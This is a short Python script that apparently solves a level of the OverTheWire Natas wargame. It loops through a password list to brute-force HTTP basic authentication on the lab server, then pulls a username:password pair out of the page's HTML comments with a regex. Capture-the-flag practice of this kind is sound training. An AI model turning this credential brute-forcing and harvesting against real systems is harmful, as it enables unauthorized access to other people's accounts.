#!/usr/bin/env python


import requests
import re

from pathlib import Path
from bs4 import BeautifulSoup, Comment


password_file = Path('passwords.txt')


level = 2
username = '%s%s' % ('natas', level)
passwords = open(password_file, 'r').readlines()

url = 'http://%s.natas.labs.overthewire.org/files/user.txt' % username


if __name__ == '__main__':

    # Read passwords and enforce bruteforce
    for password in passwords:

        password = password.strip()

        # Pass the username and password to request
        http = requests.post(url, auth=(username, password))

        if http.status_code != 200:
            pass

        else:
            # Create a BS parser
            soup = BeautifulSoup(http.text, 'html.parser')

            # Get all comments in the html using anonymous function
            result = soup.find_all(string=lambda text: isinstance(text, Comment))

            # Get the exact match using a pattern and print
            print(re.search(r'[a-z0-9]{6,}\:[a-zA-Z0-9]{32,}', result[1]))

            break
